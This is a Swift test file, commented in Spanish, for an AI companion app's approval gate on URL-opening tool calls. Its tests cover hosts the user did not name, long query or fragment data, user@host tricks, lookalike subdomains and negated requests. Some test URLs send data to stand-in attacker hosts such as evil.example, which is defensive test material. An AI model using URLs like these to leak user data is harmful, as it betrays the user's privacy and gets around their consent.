import CompanionCore
import CompanionTestKit
import Foundation
import Testing

// open_url no pide hoja para ninguna URL http(s), la haya dicho o no la usuaria:
// abrir es navegar. Lo que la pagina envia, paga o borra se juzga aparte.
@Test @MainActor func parentToolGateTests() {
    testOpeningAnHTTPAddressNeverAsks()
    testOtherToolsAreNeverGated()
    testAnAddressThatCarriesDataToAnUnsaidHostAsks()
    testTheBridgeAsksUnlessTheHostWasSaid()
    testSubdomainsOfSharedHostsNeedTheWholeHost()
    testNegationIsNotConsent()
}

private func call(_ url: String) -> ToolCallRef {
    ToolCallRef(id: "c1", name: "open_url", arguments: "{\"url\":\"\(url)\"}")
}

@MainActor func testOpeningAnHTTPAddressNeverAsks() {
    expect(ParentToolGate.approval(for: call("https://www.google.com/search?q=clima"), said: "busca en Safari el clima de mañana") == nil,
           "busqueda no dicha: sin hoja")
    expect(ParentToolGate.approval(for: call("https://evil.example/?q=secret"), said: "resume esto") == nil,
           "host ajeno: sin hoja")
    expect(ParentToolGate.approval(for: call("https://github.com/x/y"), said: "abre github") == nil, "host dicho: sin hoja")
    expect(ParentToolGate.approval(for: call("not a url"), said: "abre not a url") == nil,
           "lo que no es URL lo rechaza la politica, no la puerta")
}

@MainActor func testOtherToolsAreNeverGated() {
    let app = ToolCallRef(id: "c", name: "open_app", arguments: #"{"name":"Safari"}"#)
    let file = ToolCallRef(id: "c", name: "open_file", arguments: #"{"path":"~/x.md"}"#)
    expect(ParentToolGate.approval(for: app, said: "resume esto") == nil, "otras: open_app no tiene puerta")
    expect(ParentToolGate.approval(for: file, said: "resume esto") == nil, "otras: open_file no tiene puerta")
}

@MainActor func testAnAddressThatCarriesDataToAnUnsaidHostAsks() {
    let long = String(repeating: "a", count: 90)
    expect(ParentToolGate.approval(for: call("https://evil.example/?d=\(long)"), said: "busca el clima") != nil,
           "query larga a host no dicho: hoja")
    expect(ParentToolGate.approval(for: call("https://evil.example/#\(long)"), said: "") != nil,
           "fragmento largo: hoja")
    expect(ParentToolGate.approval(for: call("https://google.com@evil.example/"), said: "abre google") != nil,
           "user@host: hoja")
    expect(ParentToolGate.approval(for: call("https://www.google.com/search?q=clima%20de%20ma%C3%B1ana"), said: "") == nil,
           "busqueda corta: sin hoja")
    expect(ParentToolGate.approval(for: call("https://evil.example/?d=\(long)"), said: "abre evil.example") == nil,
           "host dicho: sin hoja aunque sea larga")
}

/// Sin palabras de la usuaria (`said` vacio) el puente siempre pide.
@MainActor func testTheBridgeAsksUnlessTheHostWasSaid() {
    expect(ParentToolGate.approval(for: call("https://www.google.com/search?q=x"), said: "", strictHost: true) != nil,
           "puente: host no dicho pide")
    expect(ParentToolGate.approval(for: call("https://github.com/x"), said: "abre github", strictHost: true) == nil,
           "puente: host dicho no pide")
}

@MainActor func testSubdomainsOfSharedHostsNeedTheWholeHost() {
    func asks(_ url: String, _ said: String) -> Bool {
        ParentToolGate.approval(for: call(url), said: said, strictHost: true) != nil
    }
    expect(asks("https://attacker.github.io/x", "busca en github"), "github no autoriza attacker.github.io")
    expect(asks("https://evil.example.com/", "abre example"), "example no autoriza evil.example.com")
    expect(!asks("https://attacker.github.io/x", "abre attacker.github.io"), "el host entero si")
    expect(!asks("https://www.github.com/x", "abre github"), "www no cuenta como subdominio")
    expect(asks("https://gi.thub.com", "abre gi"), "una etiqueta de dos letras no basta")
}

@MainActor func testNegationIsNotConsent() {
    func asks(_ url: String, _ said: String) -> Bool {
        ParentToolGate.approval(for: call(url), said: said, strictHost: true) != nil
    }
    expect(asks("https://evil.example/", "no abras https://evil.example"), "negacion: URL entera")
    expect(asks("https://github.com/", "don't open github"), "negacion: ingles")
    expect(asks("https://github.com/", "nunca abras github"), "negacion: nunca")
    expect(!asks("https://github.com/", "no sé, abre github"), "negacion: otra clausula no cuenta")
}
